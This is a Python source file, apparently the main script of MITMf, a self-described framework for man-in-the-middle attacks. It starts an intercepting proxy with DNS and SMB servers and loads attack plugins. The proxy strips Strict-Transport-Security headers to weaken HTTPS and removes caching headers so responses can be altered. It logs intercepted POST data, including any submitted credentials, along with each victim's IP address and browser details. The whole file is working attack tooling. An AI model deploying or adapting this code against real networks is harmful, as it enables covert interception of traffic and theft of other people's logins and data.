import argparse
import threading
import logging
import sys
import os

from functools import wraps
from core.utils import banners, get_ip, get_mac, logger_setup
from mitmflib.user_agents import parse
from libmproxy import controller, proxy
from libmproxy.proxy.server import ProxyServer

from core.servers.dns.DNSchef import DNSChef
from core.servers.smb.SMBserver import SMBserver

from plugins import *
from modules import *

print banners().get_banner()

if os.geteuid() != 0:
    sys.exit("[-] The derp is strong with this one")

parser = argparse.ArgumentParser(description="MITMf v0.9.8 - Framework for MITM attacks", version='0.9.8', usage='mitmf.py -i INTERFACE [mitmf options] [plugin name] [plugin options]', epilog="Use wisely, young Padawan.")
group = parser.add_argument_group("MITMf", "Options for MITMf")
group.add_argument('-i', dest='interface', required=True, help='Interface to bind to')
group.add_argument('--log-level', type=str,choices=['debug', 'info'], default="info", help="Specify a log level")
group.add_argument('--rport',dest='rport', metavar='PORT', type=int, default=10000, help="Regular proxy service port")
group.add_argument('--tport',dest='tport', metavar='PORT', type=int, default=10001, help="Transparent proxy service port")
group.add_argument('--ssl', dest='ssl', action='store_true', default=[r'.*:443'], help='Enable SSL/TLS interception')
group.add_argument('--disable-cachekill', dest='dis_cachekill', action='store_true', help='Enables page caching')

#Get everything that inherates from the Plugin class
plugins = [plugin(parser) for plugin in plugin.Plugin.__subclasses__()]

#Get everything that inherates from the Module class
modules = [module(parser) for module in module.Module.__subclasses__()]

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

options = parser.parse_args()

print "[-] Initializing modules, plugins and servers"
called_modules = []
for module in modules:
    if vars(options)[module.optname] is True:
        print "|_ {} v{}".format(module.name, module.version)
        called_modules.append(module)

called_plugins = []
for plugin in plugins:
    if vars(options)[plugin.optname] is True:
        print "|_ {} v{}".format(plugin.name, plugin.version)
        called_plugins.append(plugin)

formatter = logging.Formatter("%(asctime)s %(clientip)s [type:%(browser)s-%(browserv)s os:%(clientos)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
logger_setup().log_level = logging.__dict__[options.log_level.upper()]
logger = logger_setup().setup_logger('mitmf', formatter)

def concurrent(func):
    '''This makes all events concurrent (emulates the decorator in inline scripts)'''

    @wraps(func)
    def concurrent_func(*args, **kwargs):
        t = threading.Thread(name=func.func_name, target = func, args = args, kwargs = kwargs)
        t.start()
        return t

    return concurrent_func

class StickyMaster(controller.Master):
    def __init__(self, server):
        controller.Master.__init__(self, server)

        options.ip       = get_ip(options.interface)
        options.mac      = get_mac(options.interface)
        self.mode        = server.config.mode
        self.options     = options
        self.handle_post_output = False

        for key, value in vars(options).iteritems():
            setattr(self, key, value)

    def run(self):
        try:
            for plugin in called_plugins:
                plugin_hook = getattr(plugin, 'initialize')
                plugin_hook(self)

            if self.mode == 'spoof':
                for module in called_modules:
                    module_hook = getattr(module, 'initialize')
                    module_hook(self)

            return controller.Master.run(self)
        except KeyboardInterrupt:
            self.handle_shutdown()
            self.shutdown()

    def log(self, message):
        logger.info(message, extra=self.clientinfo)

    @concurrent
    def handle_request(self, flow):
        user_agent = parse(flow.request.headers['User-Agent'][0])
        try:
            self.clientinfo = {"clientip": flow.client_conn.address.host,
                               "browser" : user_agent.browser.family,
                               "browserv": user_agent.browser.version[0],
                               "clientos": user_agent.os.family}
        except IndexError:
            self.clientinfo = {"clientip": flow.client_conn.address.host,
                               "browser" : user_agent.browser.family,
                               "browserv": "Other",
                               "clientos": user_agent.os.family}

        del flow.request.headers['Cache-Control']

        del flow.request.headers['Accept-Encoding']

        if not options.dis_cachekill:

            del flow.request.headers['If-Modified-Since']

            del flow.request.headers['If-None-Match']

            flow.request.headers['Pragma'] = ['no-cache']

        logger.info("Sending request: {}".format(flow.request.host), extra=self.clientinfo)

        for plugin in called_plugins:
            plugin_hook = getattr(plugin, 'request')
            plugin_hook(self, flow)

        if flow.request.method == "POST" and flow.request.content and (self.handle_post_output is False):
            logger.info("POST Data ({}):\n{}".format(flow.request.host, flow.request.content), extra=self.clientinfo)

        self.handle_post_output = False

        flow.reply()

    @concurrent
    def handle_responseheaders(self, flow):

        if not options.dis_cachekill:
            flow.response.headers['Expires'] = ["0"]
            flow.response.headers['Cache-Control'] = ["no-cache"]

        for plugin in called_plugins:
            plugin_hook = getattr(plugin, 'responseheaders')
            plugin_hook(self, flow)

        flow.reply()

    @concurrent
    def handle_response(self, flow):
        if "Strict-Transport-Security" in flow.response.headers:
            del flow.response.headers["Strict-Transport-Security"]
            logger.info("Zapped a Strict-Trasport-Security header for {}".format(flow.request.host), extra=self.clientinfo)

        for plugin in called_plugins:
            plugin_hook = getattr(plugin, 'response')
            plugin_hook(self, flow)

        flow.reply()

    def handle_shutdown(self):
        for plugin in called_plugins:
            plugin_hook = getattr(plugin, 'on_shutdown')
            plugin_hook(self)

        if self.mode == 'spoof':
            for module in called_modules:
                module_hook = getattr(module, 'on_shutdown')
                module_hook(self)

print "|"
DNSChef().start()
print "|_ DNS (DNSChef)"
SMBserver().start()
print "|_ SMB (Impacket)"
print "|"
print "|_ mitmproxy online\n"

if not options.ssl:
    options.ssl = []

config = proxy.ProxyConfig(ignore_hosts=options.ssl, port=options.rport)
server = ProxyServer(config)
m = StickyMaster(server)
t = threading.Thread(name='regular-proxy', target=m.run)
t.setDaemon(True)
t.start()

config = proxy.ProxyConfig(mode='spoof', ignore_hosts=options.ssl, port=options.tport)
server = ProxyServer(config)
m = StickyMaster(server)
m.run()
